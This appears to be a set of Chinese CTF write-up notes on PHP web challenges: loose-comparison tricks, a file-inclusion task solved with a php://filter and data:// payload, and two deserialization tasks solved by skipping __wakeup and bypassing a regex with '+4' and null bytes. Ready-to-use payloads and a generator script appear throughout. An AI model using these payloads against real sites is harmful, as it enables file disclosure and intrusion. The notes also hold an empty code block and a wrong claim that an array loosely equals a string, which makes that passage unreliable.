`substr(string $string, int $offset, ?int $length = null)` 是 PHP 中用于**截取字符串片段**的函数，参数含义：
- `$string`：要截取的原始字符串（这里是 `md5($b)` 生成的 32 位哈希值）。
- `$offset`：截取的起始位置（关键！当 `$offset` 为**负数**时，表示从字符串的 “末尾” 开始计数，`-6` 即 “从末尾往前数第 6 个字符”）。
- `$length`：要截取的字符长度（这里是 `6`，表示从起始位置往后截取 6 个字符）。

```python
import hashlib

```

PHP 中使用 `>` 进行松散比较时，会自动将非数字类型**隐式转换为数字**后再比较：
- 字符串：从左到右提取数字部分，遇到非数字字符则停止（如 `'2023a'` 转换为 `2023`，`'a2023'` 转换为 `0`）。
- 布尔值：`true` 转换为 `1`，`false` 转换为 `0`。
- 其他类型（如数组、对象）：通常转换为 `0` 或引发比较失败。

`array_search($needle, $haystack)` 在默认情况下是**松散比较**（`==`），而非严格比较（`===`）。这意味着：

如果 `$c["n"]` 中的某个元素与 `"DGGJ"` 松散相等（`==`），`array_search` 会认为找到并返回其索引；但严格比较（`===`）时不相等，从而绕过遍历检查。
- `["DGGJ"] == "DGGJ"`：PHP 中数组与字符串松散比较时，数组会被视为 `true`，而非空字符串也为 `true`，因此 `==` 成立（返回 `true`）。
- `["DGGJ"] === "DGGJ"`：严格比较时类型不同（数组 vs 字符串），不成立（返回 `false`）。
- array_search 判断的方式相当于比较,判断`$c["n"]`中是否存在字符串"DGGJ",如果我们设置为0 .那么这个函数就会类型比较,从而将字符串转化为数值。而字符串"DGGJ"中无数字,故转为0  .和我们的数组内容相同。返回true.

## fileclude
`include()` 的作用是：**将指定文件的内容读取到当前脚本中，并当作 PHP 代码执行**。
`file_get_contents()` 是 PHP 中一个用于读取文件内容的核心函数，能够将文件（本地、远程或通过伪协议访问的资源）的内容以字符串形式返回，在 Web 开发和 CTF 题目中频繁出现，以下是详细解析：
```php
<?php  
include("flag.php");  //包含flag.php文件
highlight_file(__FILE__);  
if(isset($_GET["file1"]) && isset($_GET["file2"]))  
{    $file1 = $_GET["file1"];    $file2 = $_GET["file2"];  
    if(!empty($file1) && !empty($file2))  
    {  
        if(file_get_contents($file2) === "hello ctf")//读取file2的内容必须严格等于"hello ctf"（===表示值和类型完全一致）
        {  
            include($file1);  
        }  
    }  
    else  
        die("NONONO");  
}
```
payloads`?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello ctf`通过php://filter协议读取flag文件并以base64形式输出，file2用data://协议伪装成一个文件，这样可以得到一串字符，base64解码后就是flag

## unserialize3
题目
```php
class xctf{  
public $flag = '111';  
public function __wakeup(){  
exit('bad requests');  
}  
?code=
```
存在一个反序列化漏洞：当序列化字符串中表示**对象属性个数的值大于实际属性个数**时，会跳过`__wakeup()`的执行。所以编写一个
```php
<?php
class xctf{ #创建一个名为xctf的类
public $flag = '111'; #给xctf类创建一个$flag属性，并且赋值为111
public function __wakeup(){ #创建一个__wakeup方法
exit('bad requests'); #输出bad requests后退出当前脚本
}
}
$chen = new xctf();
$chen = serialize($chen);
print_r($chen);
?>
```
在本地运行得到`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`改为`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`得到flag
## Web_php_unserialize
首先源码
```php
<?php class Demo {   
    private $file = 'index.php';  
    public function __construct($file) {         $this->file = $file;   
    }  
    function __destruct() {   
        echo @highlight_file($this->file, true);   
    }  
    function __wakeup() {   
        if ($this>file != 'index.php') {             //the secret is in the fl4g.php            
        $this->file = 'index.php';   
        }   
    }   
}  
if (isset($_GET['var'])) {     $var = base64_decode($_GET['var']);   
    if (preg_match('/[oc]:\d+:/i', $var)) {   
        die('stop hacking!');   
    } else {  
        @unserialize($var);   
    }   
} else {     highlight_file("index.php");   
} ?>
```
`__wakeup()`会强制将`$file`改回`index.php`，需利用漏洞：**当序列化字符串中属性个数大于实际个数时，`__wakeup()`不执行**。原始属性个数是`1`，我们改为`2`（大于 1 即可） 绕过正则`/[oc]:\d+:/i`检测，正则会拦截`O:数字:`的格式（如`O:4:`），需在数字前加`+`号（PHP 会忽略`+`，但正则`\d+`不匹配`+4`）。
私有属性`$file`序列化后实际包含**空字符`\0`**（ASCII 码 0），上面的`"Demofile"`是显示效果，实际应为`\0Demo\0file`。在 URL 传输和 base64 编码时需保留空字符，否则反序列化会失败。
```PHP
<?php
class Demo{
private $file = 'fl4g.php';
}
$chen = new Demo();
$chen = serialize($chen);
print_r($chen);
echo base64_encode('O:+4:"Demo":2:{s:10:"'.chr(0).'Demo'.chr(0).'file";s:8:"fl4g.php";}');
?>
```
因为在线base64编码对空字符的编码有问题，所以就用php实现编码了，空字符用chr(0)代替，不能简单的用空格，那样不对，得到的编码格式发送得到flag
